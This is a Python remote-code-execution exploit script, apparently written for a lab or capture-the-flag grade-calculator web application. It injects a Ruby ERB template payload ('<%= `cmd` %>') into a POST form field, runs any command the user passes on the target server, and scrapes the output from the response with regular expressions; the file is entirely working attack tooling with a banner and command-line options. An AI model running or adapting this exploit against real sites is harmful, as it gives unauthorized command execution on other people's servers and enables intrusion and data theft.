#!/bin/python3
import re, requests, argparse, signal, sys

def Ctrl_z(sig,frame):
        print("\n\n\033[1;33;40mProccess Interrupted.\n\n\033 \033[1;37;40m")
        sys.exit(0)

signal.signal(signal.SIGINT, Ctrl_z)

def post_req(url, command):
        header = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}
        # Ironically in this way we did not need to url encode.
        data = {'category1':f'{command}','grade1':80,'weight1':100,
                'category2':'b','grade2':0,'weight2':0,
                'category3':'c','grade3':0,'weight3':0,
                'category4':'d','grade4':0,'weight4':0,
                'category5':'e','grade5':0,'weight5':0}

        return requests.post(url, data=data, headers=header)

def regex_match(pattern1, pattern2, post_response):
        # List result
        regex = re.findall(pattern1,post_response.text)
        tmp_regex = ''.join(str(e) for e in regex)
        regex_output = re.sub(pattern2, '', tmp_regex)
        return ''.join(str(e) for e in regex_output)


shellricko = '''
\033[1;32;40m  =======  \033 ||   || \033  \033  \033  =======  \033 \033 ||       \033 \033 ||       \033  \033 =======     \033  \033 ========  \033  \033    =======  \033  \033 ||   //    \033  \033   =====      \033  \033[1;37;40m
\033[1;32;40m ((        \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033 ||      ))   \033  \033    ||     \033  \033  ((         \033  \033 ||  //     \033  \033 ||     ||    \033  \033[1;37;40m
\033[1;32;40m ((        \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033 ||       ))  \033  \033    ||     \033  \033  ((         \033  \033 || //      \033  \033 ||     ||    \033  \033[1;37;40m
\033[1;32;40m   =====   \033  )===(  \033  \033  \033   ====    \033 \033 ||       \033 \033 ||      \033  \033 ||      ))   \033  \033    ||     \033  \033  ((         \033  \033 ||((       \033  \033 ||     ||    \033  \033[1;37;40m
\033[1;32;40m        )) \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033  =====((     \033  \033    ||     \033  \033  ((         \033  \033 || \\\\      \033  \033 ||     ||  \033  \033[1;37;40m
\033[1;32;40m        )) \033 ||   || \033  \033  \033 ((        \033 \033 ||       \033 \033 ||      \033  \033 ||     \\\   \033  \033     ||     \033  \033  ((        \033  \033  ||  \\\\     \033  \033 ||     || \033  \033[1;37;40m
\033[1;32;40m  =======  \033 ||   || \033  \033  \033  =======  \033 \033  ======= \033 \033  =======\033  \033 ||      \\\  \033  \033  ========  \033  \033    ======= \033  \033  ||   \\\\    \033  \033   =====   \033  \033[1;37;40m
'''

if __name__ == '__main__':
        parser = argparse.ArgumentParser(usage='python3 RCE.py OPTIONS -u url', description='RCE exploit')
        parser.add_argument_group('Requered parameters')
        parser.add_argument('--command', '-c', help='Command to execute on remote server. Use "ls -al".')
        parser.add_argument('--url', '-u', help='Target URL.')
        parser.add_argument('--banner', help='Show banner', default='show', choices=['show','no-show'])
        args = parser.parse_args()

        cmd = args.command
        url = args.url
        banner = args.banner

        if banner == 'show':
                print(shellricko)
        else:
                pass

        # Injection format: <%= `BAD STUFF` %>
        post_response = post_req(url, f'<%= `{cmd}` %>\nTEXT')
        output = regex_match("\d{2}\W{2}p\W[a-zA-Z0-9\w\W\s\S]*\n\nTEXT", "\d{2}\W{2}p\>", post_response)
        print(f"$ {output}")
